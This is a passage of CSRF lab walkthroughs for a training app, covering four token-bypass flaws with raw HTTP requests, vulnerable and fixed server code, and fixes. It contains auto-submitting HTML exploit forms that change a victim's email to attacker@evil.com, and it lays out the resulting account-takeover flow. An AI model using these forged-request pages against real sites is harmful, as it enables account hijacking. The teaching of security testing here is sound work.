**Your goal:** Remove the CSRF token from the forged request and change the victim's email address.

> **Simple version:** The lock only works if you put a key in. If you walk up and don't touch the lock at all, the door opens. Don't include a key — just push the door.

---

### How Lab 3 Differs from Labs 1 and 2

| | Lab 1 | Lab 2 | Lab 3 |
|---|---|---|---|
| **Has CSRF token?** | ❌ No | ✅ Yes | ✅ Yes |
| **Bypass method** | Any POST works | Switch to GET | Remove token completely |
| **Flaw** | No defence | Only checks POST | Only checks if token present |
| **Key insight** | No protection | Method check missing | Absent ≠ validated |

The critical difference in Lab 3:

```
Sending csrf=WRONG_VALUE  → 403 Forbidden   ← server DOES validate when present
Sending NO csrf field     → 200 OK          ← server SKIPS check when absent
```

The server logic is broken:
```
❌ Vulnerable logic:
   if csrf_param EXISTS → validate it
   else → skip check (BUG!)

✅ Correct logic:
   if csrf_param MISSING or WRONG → reject
   else → proceed
```

---

### Step 1 — The Vulnerable HTTP Request

When a user legitimately changes their email, the request looks like this:
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

csrf=WfF1szJYmIDgg7s2JMDbmMYpFYWEqUNd&email=new@email.com
```

The CSRF token is present and valid → request succeeds.

---

### Step 2 — CSRF Condition Analysis

**✅ Condition 1 — Relevant Action**
Email change → attacker can trigger password reset → full account takeover. Same as Labs 1 and 2.

**✅ Condition 2 — Cookie-Based Session Handling**
Only `Cookie: session=...` identifies the user. No additional per-request authentication.

**✅ Condition 3 — No Unpredictable Parameters (when token is removed)**

With token present: ❌ Token is unpredictable — attacker can't forge it  
**Without token field: ✅ Only `email` parameter — attacker knows this value**

```
POST with csrf=XXXX → server validates → attacker can't forge → blocked
POST with NO csrf   → server skips    → only email needed   → FORGED ✅
```

---

### Step 3 — Testing in Burp Suite

**Step 1 — Intercept the normal POST:**
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Cookie: session=victim_session

csrf=validToken123&email=test@test.com
```

**Step 2 — Change the token to a wrong value in Repeater:**
```
csrf=WRONG_TOKEN&email=test@test.com
```
→ Response: **403 Forbidden** ← token IS validated when present

**Step 3 — Remove the csrf parameter entirely:**
```
email=test@test.com
```
(No `csrf=...` anywhere in the body)
→ Response: **200 OK** ← token check SKIPPED when absent ✅

**This is the vulnerability confirmed.**

---

### Step 4 — The Two Requests Side by Side

**Token present but wrong → BLOCKED:**
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
Content-Type: application/x-www-form-urlencoded

csrf=WRONG_TOKEN&email=attacker@evil.com
```
**Response: 403 Forbidden** ❌

---

**Token completely absent → ALLOWED:**
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com
```
**Response: 200 OK** ✅

> **Key difference:** The field is not there at all — not empty, not wrong — completely absent.

---

### Step 5 — Construct the CSRF Exploit

The exploit is a simple POST form **without any csrf field**:

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://vulnerable-website.com/my-account/change-email"
              method="post"
              id="csrf-form"
              target="csrf-iframe">
            <input type="hidden" name="email" value="attacker@evil.com">
            <!-- No csrf field at all — deliberately omitted -->
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

**Breaking it down:**

| Part | What it does |
|---|---|
| `method="post"` | Sends as POST (Lab 3 uses POST, unlike Lab 2 which switched to GET) |
| `name="email"` only | No `csrf` input field at all — the server skips validation |
| `target="csrf-iframe"` | Response loads in hidden iframe — victim sees nothing |
| `<h1>Hello World!</h1>` | Makes the page look innocent |
| `document.getElementById("csrf-form").submit()` | Auto-fires on page load |

**Simpler version (Community Edition template):**
```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="post">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- No csrf field -->
</form>
<script>
    document.forms[0].submit();
</script>
```

> **Compare with a BLOCKED attempt** — if someone mistakenly includes a wrong token:
> ```html
> <input type="hidden" name="csrf" value="MADE_UP_TOKEN">  ← this would be rejected!
> ```
> The bypass only works if the field is completely **absent** — not present with a wrong value.

---

### Step 6 — Full Solution (Step by Step)

1. **Log in** as `wiener:peter` → go to My Account
2. **Submit** the Update Email form → intercept in Burp Proxy
3. **Send to Repeater** → change `csrf` value to garbage → confirm it returns 403 (token IS checked when present)
4. **Delete the csrf parameter** entirely from the request → confirm it returns 200 (check skipped when absent)
5. **Generate the exploit:**
   - **Burp Pro:** Generate CSRF PoC → enable auto-submit → copy HTML
   - **Our lab:** Scroll to Generate CSRF PoC → click Generate PoC ▼
6. **Verify the PoC has NO csrf field** (it should not — if Burp generated it, it won't include the token)
7. **Go to Exploit Server** → paste HTML → click **Store**
8. **Test on yourself** → click "View exploit" → check your email changed
9. **Update the email** in the exploit to something different from your own
   > ⚠️ **Hint:** Cannot use an email already taken. Use a fresh, unique email.
10. **Store** → click **Deliver to victim** → **Lab Solved!** ✅

---

### What Actually Happens (Full Flow)

```
[evil.com exploit page loads]
        │
        │ POST /email/change
        │ Cookie: session=victim_session_abc123  ← auto-attached
        │ (no csrf field in body)
        │
        ▼
[Server receives request]
        │
        │ Checks: "Is csrf parameter present?" → No
        │ Skips CSRF validation (BUG)
        │ Processes: email changed ✅
        │
        ▼
[Victim's email = attacker@evil.com]
        │
        ▼
[Attacker does password reset → account takeover 🔓]
```

---

### Why the Developer Made This Mistake

A common but dangerous coding pattern:

```javascript
// ❌ Vulnerable — only validates when token is present
app.post('/email/change', (req, res) => {
    if (req.body.csrf) {                          // only runs IF csrf exists
        if (req.body.csrf !== validToken) {
            return res.status(403).send('Invalid token');
        }
    }
    // If csrf is absent → falls through to here without any check!
    changeEmail(req.body.email);
});
```

The fix — always reject if token is missing OR wrong:

```javascript
// ✅ Correct — rejects missing token same as invalid token
app.post('/email/change', (req, res) => {
    if (!req.body.csrf || req.body.csrf !== validToken) {
        return res.status(403).send('Invalid or missing CSRF token');
    }
    changeEmail(req.body.email);
});
```

**The rule:** A missing token must be treated **identically** to an invalid token — both should be rejected.

---

### How Lab 3 Differs from Lab 2 in the Exploit

| | Lab 2 | Lab 3 |
|---|---|---|
| **Request method** | GET (switched from POST) | POST (stays as POST) |
| **Token in exploit** | Not needed (GET skips check) | Not included (absent = skipped) |
| **Exploit trigger** | `document.location` | Form auto-submit |
| **Core trick** | Change the method | Remove the field |

---

### Key Takeaways for Lab 3

| Concept | Summary |
|---|---|
| **Vulnerability** | CSRF token only validated when parameter exists |
| **Root cause** | `if (token_present) { validate }` instead of `if (!token_valid) { reject }` |
| **Attack method** | Send POST form with no `csrf` field at all |
| **Key difference** | Token absent ≠ Token wrong — server treats them differently (bug!) |
| **Fix** | Reject request if token is missing OR invalid |

---

### The PoC in Our Lab

1. Open `http://localhost:3000/lab/token-present`
2. Scroll to **"🔧 Generate CSRF PoC"** section
3. Click **Generate PoC ▼** → POST form without csrf field appears
4. Type your target email → PoC updates in real-time
5. Click **⚡ Send to Exploit Server**
6. Click **Deliver exploit to victim**
7. **"🎉 Lab Solved!"** banner appears

---

---

## Lab 4 — CSRF where token is not tied to user session

> **Difficulty:** PRACTITIONER  
> **URL:** `http://localhost:3000/lab/token-session`  
> **Credentials:** `wiener:peter` and `carlos:montoya` (two accounts needed)

---

### What is this lab about?

This lab has an email change form **with a CSRF token** — and the server validates it correctly for the current request method. BUT the server keeps a **global pool of valid tokens** that are not connected to any specific user session.

This means: a token generated for `wiener` also works for `carlos` — and vice versa.

**Your goal:** Log in as the attacker, grab your own valid CSRF token, and use it in a forged request targeting the victim's session.

> **Simple version:** The cinema checks that your ticket is a real cinema ticket — but doesn't check your name or seat number. Any real ticket gets anyone into any seat. Use your own real ticket to get someone else into a seat they didn't buy.

---

### Why This Flaw Exists — Global Token Pool

A correctly implemented CSRF token is:
```
Token stored in: User's SESSION (server-side)
Token checked:   Does request token match THIS USER's session token?
```

A globally pooled token (the bug) works like:
```
Token stored in: Shared pool (any user can use any token)
Token checked:   Is this token anywhere in the pool?  ← too broad!
```

**Visualised:**

```
CORRECT (session-tied):
User wiener logs in → server creates token X → stores in wiener's session
Request arrives with token X + wiener's cookie → ✅ match
Request arrives with token X + carlos's cookie → ❌ wrong session

VULNERABLE (global pool):
Token pool: [ tokenA, tokenB, tokenC, tokenD ]
                ↑
         attacker gets tokenA when they log in as wiener
Request arrives with tokenA + carlos's cookie → ✅ tokenA is in pool → accepted!
```

---

### Step 1 — CSRF Condition Analysis

**✅ Condition 1 — Relevant Action**
Email change → password reset → full account takeover. Same as previous labs.

**✅ Condition 2 — Cookie-Based Session Handling**
Sessions tracked only via cookie. Browser attaches it automatically.

**✅ Condition 3 — No Unpredictable Parameters (for the attacker)**

Normally: Token is unpredictable → attacker cannot guess it  
This flaw: Attacker has their OWN valid token → they know a valid value!

```
Attacker logs in as wiener → captures tokenA
Victim is logged in as carlos → has session cookie
Attacker sends forged POST with:
   - carlos's session cookie (browser attaches automatically)
   - tokenA (attacker's own token — valid in the global pool)
→ Server checks: "Is tokenA in the pool?" → YES ✅
→ Server processes for carlos ← WRONG!
```

---

### Step 2 — The Two Accounts

This lab gives you two accounts specifically to demonstrate the vulnerability:

| Account | Role | Purpose |
|---|---|---|
| `wiener:peter` | Attacker | Log in, capture your own CSRF token |
| `carlos:montoya` | Victim | The account being targeted |

In real life, the attacker would use their own legitimate account to get a valid token.

---

### Step 3 — Testing in Burp Suite (Proving the Vulnerability)

**Step 1 — Log in as wiener, intercept the email change request:**
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Cookie: session=WIENER_SESSION

csrf=tokenFromWiener&email=test@test.com
```
Note down `tokenFromWiener`. Drop this request (don't submit).

**Step 2 — Open a private/incognito window, log in as carlos:**

In Burp Repeater, send:
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Cookie: session=CARLOS_SESSION

csrf=tokenFromWiener&email=test@test.com
```

**Step 3 — Observe the result:**
- If `403 Forbidden` → token is session-tied (secure)
- If `200 OK` → **token is not session-tied! (vulnerable)** ✅

The response is 200 — confirmed: wiener's token works on carlos's session.

---

### Step 4 — The Raw HTTP Requests Side by Side

**Wiener's legitimate request (generates the token):**
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Cookie: session=WIENER_SESSION_ABC123

csrf=pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB&email=wiener@normal-user.com
```

**Forged request using wiener's token — targeting carlos:**
```http
POST /my-account/change-email HTTP/1.1
Host: vulnerable-website.com
Cookie: session=CARLOS_SESSION_XYZ789   ← carlos's session

csrf=pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB&email=attacker@evil.com
                ↑
         wiener's token — still valid because pool is global
```

**Server response: 200 OK** ✅ Carlos's email is changed.

---

### Step 5 — Construct the CSRF Exploit

The exploit looks similar to Lab 1's basic form — but this time we include a valid CSRF token (our own, captured from our own account):

```html
<html>
    <body>
        <h1>Hello World!</h1>
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <form action="https://vulnerable-website.com/my-account/change-email"
              method="post"
              id="csrf-form"
              target="csrf-iframe">
            <input type="hidden" name="email" value="attacker@evil.com">
            <input type="hidden" name="csrf" value="pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB">
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```

> **Critical note:** CSRF tokens in this lab are **single-use**. Once used, they're removed from the pool. You must capture a **fresh token** just before delivering the exploit.

**Workflow:**
```
1. Log in as wiener
2. Intercept the change-email request → capture fresh tokenX → DROP the request
   (don't use it — save it for the exploit)
3. Put tokenX in the exploit HTML
4. Deliver exploit to victim (carlos)
5. Carlos's session cookie + tokenX → server accepts → email changed
```

---

### Step 6 — Full Solution (Step by Step)

1. **Log in** as `wiener:peter` in Burp's browser
2. **Submit** the Update Email form → **intercept** the request in Burp
3. **Note down** the `csrf` value (e.g. `pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB`)
4. **Drop** the request (don't forward it — keeps the token fresh in the pool)
5. **Open private/incognito window**, log in as `carlos:montoya`
6. **Submit** carlos's email form → send to **Burp Repeater**
7. In Repeater, **swap** carlos's CSRF token with wiener's token → send
8. **Confirm 200 OK** — token is not session-tied, exploit is valid
9. **Build the exploit HTML** with wiener's captured token:
   ```html
   <input type="hidden" name="csrf" value="WIENER_CAPTURED_TOKEN">
   ```
10. **Go to Exploit Server** → paste HTML → click **Store**
11. **Test on yourself** → confirm email changes
12. **Update email** to something not already registered
13. **Capture a NEW fresh token** from wiener's account (single-use!) and update the exploit
14. **Store** → click **Deliver to victim** → **Lab Solved!** ✅

---

### What Actually Happens (Full Flow)

```
[Attacker logs in as wiener]
        │
        │  Captures fresh CSRF token: pBMFhDgHN...
        │  (does NOT use it — saves it for exploit)
        │
        ▼
[Exploit page delivered to victim (carlos)]
        │
        │  POST /my-account/change-email
        │  Cookie: session=CARLOS_SESSION  ← auto-attached from carlos's browser
        │  csrf=pBMFhDgHN...              ← wiener's token (valid in global pool)
        │  email=attacker@evil.com
        │
        ▼
[Server validates:]
        │  "Is pBMFhDgHN... in the token pool?" → YES ✅
        │  (Server doesn't check WHOSE session this token came from)
        │  Email changed for carlos ✅
        │
        ▼
[Attacker requests password reset for carlos]
        │  Reset link goes to attacker@evil.com
        ▼
[Attacker resets password → full account takeover 🔓]
```

---

### The Critical Difference vs Other Labs

| Lab | Token situation | Bypass |
|---|---|---|
| Lab 1 | No token | Any POST works |
| Lab 2 | Token only on POST | Switch to GET |
| Lab 3 | Token only when present | Remove the field |
| **Lab 4** | **Token valid globally** | **Use attacker's own token** |

Lab 4 has a token AND validates it — but validation is insufficient because it doesn't check session ownership.

> **Real-world impact:** This flaw is common when CSRF tokens are stored in a database or cache without being linked to a session. The fix is to store tokens in the server-side session object so they are automatically tied to the user.

---

### Why This Flaw Exists

```javascript
// ❌ Vulnerable — global pool (not session-tied)
const tokenPool = new Set();

app.get('/get-token', (req, res) => {
    const token = generateRandomToken();
    tokenPool.add(token);               // stored in global pool
    res.send(token);
});

app.post('/email/change', (req, res) => {
    if (!tokenPool.has(req.body.csrf)) { // only checks pool membership
        return res.status(403).send('Invalid token');
    }
    tokenPool.delete(req.body.csrf);    // single-use — removed after use
    changeEmail(req.body.email);
    // ← no check that this token belongs to THIS session!
});
```

```javascript
// ✅ Correct — session-tied token
app.post('/email/change', (req, res) => {
    if (!req.session.csrfToken ||
        req.body.csrf !== req.session.csrfToken) {  // checks THIS session
        return res.status(403).send('Invalid token');
    }
    delete req.session.csrfToken;   // invalidate after use
    changeEmail(req.body.email);
});
```

---

### Key Takeaways for Lab 4

| Concept | Summary |
|---|---|
| **Vulnerability** | CSRF tokens stored in global pool — not tied to user sessions |
| **Root cause** | Token validates "is this real?" not "is this mine?" |
| **Attack method** | Capture own valid token, include it in forged request targeting victim |
| **Two accounts needed** | One to generate a valid token, one to be the victim |
| **Single-use tokens** | Must capture a fresh token just before delivering exploit |
| **Fix** | Store CSRF tokens in server-side session — validate against `req.session.csrfToken` |

---

### In Our Local Lab

In the CSRF Master lab, the global token pool contains these pre-loaded tokens:
```
csrf_token_abc123xyz  ← attacker's token (shown in Token Inspector)
csrf_token_def456uvw
csrf_token_ghi789rst
```

1. Open `http://localhost:3000/lab/token-session`
2. The **Token Inspector** shows the attacker's pool token: `csrf_token_abc123xyz`
3. Scroll to **"🔧 Generate CSRF PoC"** → click Generate PoC ▼
4. PoC already includes `value="csrf_token_abc123xyz"` — the attacker's own token
5. Click **⚡ Send to Exploit Server** → **Deliver exploit to victim**
6. Server checks the pool: `csrf_token_abc123xyz` is valid → victim's email changes
7. **"🎉 Lab Solved!"** banner appears

---

---

# Lab Walkthroughs

---

## Lab 1 — CSRF Vulnerability with No Defenses

| | |
|---|---|
| **Difficulty** | APPRENTICE |
| **Lab URL** | `http://localhost:3000/lab/no-defenses` |
| **Vulnerable App** | `http://localhost:3000/my-account` |
| **Goal** | Change the victim's email address using a CSRF attack |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

This lab contains an email change function that has **absolutely no CSRF protection** — no token, no SameSite cookie restriction, no Referer check.

Your job: craft an HTML page that forces the victim's browser to silently change their email address when they visit it.

> **Important tip (same as PortSwigger):** You cannot register an email address already taken by another user. When testing your exploit on yourself first, use a throwaway email. Use a **different** email for the final exploit you deliver to the victim.

---

### Step-by-Step Solution

#### Step 1 — Log in and find the vulnerable request

1. Open `http://localhost:3000/my-account`
2. You are pre-logged in as **wiener** (credentials: wiener / peter)
3. Notice the **Update Email** form — it POSTs to `/email/change/1` with just one parameter: `email`
4. There is **no CSRF token** in the form (see the red warning note below the form)

The HTTP request that gets sent when you update the email looks like this:

```http
POST /email/change/1 HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=victim_session_abc123

email=wiener@normal-user.net
```

---

#### Step 2 — Check the three CSRF conditions

Before exploiting, confirm all three conditions are satisfied:

**✅ Condition 1 — Relevant Action**

The action is **changing the email address** — highly relevant.
If an attacker changes the email to one they control, they can then trigger a password reset and fully take over the account.

**✅ Condition 2 — Cookie-Based Session Handling**

The application uses only a session cookie to identify the user:
```
Cookie: session=victim_session_abc123
```
There are no other tokens or mechanisms. The browser sends this cookie automatically on every request — even cross-site ones.

**✅ Condition 3 — No Unpredictable Request Parameters**

The only parameter needed is `email=...`.
The attacker chooses this value themselves — nothing is random or secret.
If there were a CSRF token the attacker couldn't predict, this would not be exploitable.

> **All 3 conditions met → This endpoint is VULNERABLE to CSRF.**

---

#### Step 3 — Generate the exploit HTML

**Option A: Use the built-in PoC Generator (like Burp Suite Pro)**

1. Go to `http://localhost:3000/lab/no-defenses`
2. Scroll down to the **"🔧 Generate CSRF PoC"** section
3. Click **"Generate PoC ▼"**
4. Type the target email in the **Update Email** field — the PoC updates live
5. The generated HTML looks like this:

```html
<html>
  <!-- CSRF PoC - generated by CSRF Master -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/email/change/1" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

**Option B: Write it manually (Burp Suite Community Edition style)**

```html
<form method="POST" action="http://localhost:3000/email/change/1">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
    document.forms[0].submit();
</script>
```

> The `history.pushState` line hides the original URL from the victim — a cosmetic trick to make the exploit page look less suspicious.

---

#### Step 4 — Upload to the Exploit Server

1. Click **"⚡ Send to Exploit Server"** (or go to `http://localhost:3000/exploit-editor` manually)
2. The PoC HTML is automatically pasted into the Body section
3. Click **"Store"** to save the exploit at `http://localhost:3000/exploit`

---

#### Step 5 — Test it on yourself first

1. On the exploit server page, click **"View Exploit"**
2. A new tab opens and the form auto-submits
3. Go back to `http://localhost:3000/my-account` — check if your email changed
4. If it worked, your email is now `attacker@evil.com`

> **Before delivering to victim:** Change the email value in the PoC to something different from your own test email (because the same address can't be used twice).

---

#### Step 6 — Deliver to victim

1. Click **"Deliver exploit to victim"** on the exploit server
2. The victim's browser opens `http://localhost:3000/exploit`
3. Their browser auto-submits the hidden form
4. Their browser automatically includes `Cookie: session=victim_session_abc123`
5. The server processes it as if the victim did it — email changed!

---

#### Step 7 — Verify the lab is solved

1. Go back to `http://localhost:3000/lab/no-defenses`
2. The **"🎉 Congratulations! Lab Solved"** green banner appears automatically
3. The **"✅ Solved"** badge lights up in the status bar
4. The **Request Inspector** shows `⚠️ CSRF DETECTED` with the forged request details

---

### What Happens Behind the Scenes

```
Victim's browser              evil.com (exploit server)         localhost:3000 (bank)
      │                              │                                   │
      │── visits /exploit ──────────▶│                                   │
      │                              │ page has auto-submit form         │
      │◀── hidden form ─────────────│                                   │
      │                              │                                   │
      │────────── POST /email/change/1 ────────────────────────────────▶│
      │           Cookie: session=victim_session_abc123                  │
      │           email=attacker@evil.com                                │
      │                              │                          accepts! │
      │◀───────────────────────── 302 redirect ─────────────────────────│
```

**Why the server can't tell it's fake:**
- The session cookie is real — the victim is genuinely logged in
- The request looks identical to a legitimate form submission
- There is no secret token that only the real page would know
- The server has no way to check where the request originated

---

### The Key Takeaway

> A CSRF attack doesn't steal your session — it hijacks your browser into **performing actions you never intended to perform**, using your own real credentials.

The fix is simple: add a **CSRF token** — a random secret value embedded in the form that the server validates. An attacker on `evil.com` cannot read that token (Same-Origin Policy blocks cross-site reads), so they can never include a valid one in a forged request.

---

### Quick Reference for Lab 1

| What | Value |
|---|---|
| Vulnerable endpoint | `POST http://localhost:3000/email/change/1` |
| Required parameter | `email=anything@domain.com` |
| CSRF token needed? | ❌ No |
| SameSite restriction? | ❌ No |
| Referer check? | ❌ No |
| Exploit method | Auto-submit hidden POST form |
| Exploit server URL | `http://localhost:3000/exploit-editor` |
| Victim URL | `http://localhost:3000/exploit` |

---

*Continue to [Lab 2 — CSRF token validated on POST only](http://localhost:3000/lab/token-method)*

---

## Lab 2 — CSRF Where Token Validation Depends on Request Method

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/token-method` |
| **Goal** | Bypass the CSRF token by switching from POST to GET |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

This application does have a CSRF token — but it only validates it for **POST requests**. GET requests bypass the check entirely. The email change endpoint accepts both methods, so an attacker can simply use GET instead of POST.

> **Simple analogy:** A security guard checks your ID only when you enter through the front door. If you use the back door (GET), they wave you straight through with no check.

---

### The Vulnerability — Where the Flaw Is

The server-side logic looks like this:

```
if (request.method === 'POST') {
    validate_csrf_token();   ← only runs for POST
}
process_email_change();      ← runs for BOTH POST and GET
```

So:
- `POST /email/change/2` with wrong/missing token → **403 BLOCKED**
- `GET /email/change/2?email=...` with no token at all → **200 ALLOWED** ✅

---

### The Intercepted HTTP Request (what you'd see in Burp)

Normal POST (protected):
```http
POST /email/change/2 HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=victim_session_abc123

email=wiener@normal-user.net&csrf=pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB
```

GET bypass (no token needed):
```http
GET /email/change/2?email=attacker@evil.com HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123
```

---

### Step-by-Step Solution

**Step 1 — Confirm the token is checked on POST**
1. Open `http://localhost:3000/lab/token-method`
2. Submit the email form — notice the form has a hidden `csrf` token field
3. The **Request Inspector** shows: `CSRF Token: pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB`

**Step 2 — Try sending POST with a wrong token**
- Submit via the form but change the token → server returns **403 Blocked**

**Step 3 — Switch to GET — token check is skipped**
- Access: `http://localhost:3000/email/change/2?email=test@test.com` directly
- No token needed — email changes!

**Step 4 — Generate the PoC**

Click **"Generate PoC ▼"** in the lab page, or use this template:

```html
<html>
  <!-- CSRF PoC - generated by CSRF Master -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      document.location = 'http://localhost:3000/email/change/2?email=attacker@evil.com';
    </script>
  </body>
</html>
```

> `document.location` causes a **top-level GET navigation** — this is key because `SameSite=Lax` cookies ARE sent with top-level GET navigations.

**Step 5 — Deliver the exploit**
1. Click **⚡ Send to Exploit Server** → opens exploit editor with PoC pre-filled
2. Click **Store**
3. Click **Deliver exploit to victim**
4. **"🎉 Lab Solved!"** banner appears on the lab page

---

### Behind the Scenes

```
evil.com exploit page            localhost:3000
        │                              │
        │  document.location = ...     │
        │──── GET /email/change/2 ────▶│
        │     ?email=attacker@evil.com │
        │     Cookie: session=abc123   │
        │                              │ No CSRF check on GET!
        │◀──── 302 redirect ───────────│
        │      email changed           │
```

**Why the cookie is sent:** SameSite=Lax allows cookies on cross-site **top-level GET navigations** (like `document.location`). The browser treats this as the user "clicking a link," so the session cookie is attached.

---

### Key Takeaway

> Developers often add CSRF protection only to POST handlers and forget that GET endpoints can also change state. **Never allow state-changing actions via GET requests** — use POST/PUT/DELETE only, and validate CSRF tokens on **all** methods.

---

### Quick Reference — Lab 2

| What | Value |
|---|---|
| Vulnerable endpoint | `GET http://localhost:3000/email/change/2?email=...` |
| POST endpoint (protected) | `POST http://localhost:3000/email/change/2` |
| CSRF token on GET? | ❌ Not checked |
| Exploit method | `document.location` redirect (GET navigation) |
| Why cookie sent? | SameSite=Lax allows GET top-level navigations |

---

*Continue to [Lab 3 — CSRF token validated only when present](http://localhost:3000/lab/token-present)*

---

## Lab 3 — CSRF Where Token Validation Depends on Token Being Present

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/token-present` |
| **Goal** | Bypass the CSRF token by removing the `csrf` parameter entirely |
| **Credentials** | wiener : peter |

---

### What This Lab Is About

This application validates the CSRF token — but **only if the `csrf` parameter exists** in the request. If you leave the parameter out completely, validation is skipped and the request is processed.

> **Simple analogy:** A bouncer checks your ID only if you hand one to them. If you just walk past without handing anything over, they let you in automatically.

---

### The Vulnerability — Where the Flaw Is

The flawed server logic:

```
if (csrf_param_exists_in_request) {
    if (csrf_value !== stored_token) {
        reject();   ← only runs when param EXISTS and is wrong
    }
}
process_email_change();  ← runs when param is ABSENT
```

The three possible cases:

| Request | Result |
|---|---|
| `csrf=correct_value` | ✅ Allowed |
| `csrf=wrong_value` | ❌ Blocked (token present but invalid) |
| *(no csrf field at all)* | ✅ **Allowed** ← the bug |

---

### The Intercepted HTTP Request

Normal form submission (has token):
```http
POST /email/change/3 HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=victim_session_abc123

email=wiener@normal-user.net&csrf=pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB
```

Bypassed — token parameter completely removed:
```http
POST /email/change/3 HTTP/1.1
Host: localhost:3000
Content-Type: application/x-www-form-urlencoded
Cookie: session=victim_session_abc123

email=attacker@evil.com
```

Notice: **no `csrf=` in the body at all** — not empty, not wrong, just completely absent.

---

### Step-by-Step Solution

**Step 1 — Test that a wrong token is blocked**
1. Open `http://localhost:3000/lab/token-present`
2. Submit the form — token is validated, email changes normally
3. Now try sending `csrf=wrong_value` → **403 Blocked**

**Step 2 — Remove the csrf field entirely**
- Craft a form with only the `email` field — no `csrf` field at all

**Step 3 — Generate the PoC**

Click **"Generate PoC ▼"** or use:

```html
<html>
  <!-- CSRF PoC - generated by CSRF Master -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:3000/email/change/3" method="POST">
      <input type="hidden" name="email" value="attacker@evil.com" />
      <!-- No csrf field — intentionally omitted, not empty -->
      <input type="submit" value="Submit request" />
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

**Step 4 — Deliver the exploit**
1. Click **⚡ Send to Exploit Server**
2. Click **Store** → **Deliver exploit to victim**
3. **"🎉 Lab Solved!"** banner appears

---

### The Critical Difference

```
csrf=""              → Parameter EXISTS (empty string) → Server validates → BLOCKED
csrf=wrong           → Parameter EXISTS (wrong value)  → Server validates → BLOCKED
(no csrf field)      → Parameter ABSENT               → Server skips    → ALLOWED ✅
```

This is why the fix must be:
```
// WRONG (vulnerable):
if (csrf_param_exists) { validate(); }

// CORRECT (secure):
if (!csrf_valid) { reject(); }   ← reject if missing OR wrong
```

---

### Key Takeaway

> A CSRF check that only runs when the token is present is the same as no CSRF check at all. **Always reject requests where the CSRF token is absent** — absence of a token must be treated the same as an invalid token.

---

### Quick Reference — Lab 3

| What | Value |
|---|---|
| Vulnerable endpoint | `POST http://localhost:3000/email/change/3` |
| Bypass | Omit `csrf` field from POST body entirely |
| `csrf=` present but wrong | ❌ Blocked |
| `csrf=` field absent | ✅ Allowed (the bug) |
| Exploit method | Hidden POST form without `csrf` field |

---

*Continue to [Lab 4 — Token not tied to user session](http://localhost:3000/lab/token-session)*

---

## Lab 4 — CSRF Where Token Is Not Tied to User Session

| | |
|---|---|
| **Difficulty** | PRACTITIONER |
| **Lab URL** | `http://localhost:3000/lab/token-session` |
| **Goal** | Use the attacker's own valid CSRF token in a forged request |
| **Credentials** | wiener : peter |
| **Attacker's token** | `csrf_token_abc123xyz` (shown in Token Inspector) |

---

### What This Lab Is About

The server has a **global pool of valid tokens** shared across all users. It checks that the submitted token is in the pool — but it never checks **which session the token belongs to**.

Since the attacker can log in and get their own valid token, they can use it in a forged request targeting the victim.

> **Simple analogy:** A cinema validates that your ticket is a real cinema ticket — but doesn't check the seat number or your name. Any valid ticket gets you into any seat.

---

### The Vulnerability — Where the Flaw Is

Server logic:

```
global_token_pool = [ 'csrf_token_abc123xyz', 'csrf_token_def456uvw', ... ]

if (submitted_token in global_token_pool) {
    allow();   ← doesn't check WHO the token belongs to
}
```

The attacker:
1. Logs in as themselves → gets token `csrf_token_abc123xyz` from the pool
2. Crafts a forged POST targeting the victim's session
3. Includes their own valid token
4. Server checks: "Is `csrf_token_abc123xyz` in the pool?" → **YES** → allowed!

---

### The Intercepted HTTP Request

Legitimate victim request:
```http
POST /email/change/4 HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123

email=wiener@normal-user.net&csrf=pBMFhDgHNqmBWsFtbwuJaonDwBOGrTQB
```

Forged request using attacker's own token:
```http
POST /email/change/4 HTTP/1.1
Host: localhost:3000
Cookie: session=victim_session_abc123   ← victim's cookie (sent automatically)

email=attacker@evil.com&csrf=csrf_token_abc123xyz   ← attacker's own valid token
```

---

### Step-by-Step Solution

**Step 1 — Find the attacker's token**
1. Open `http://localhost:3000/lab/token-session`
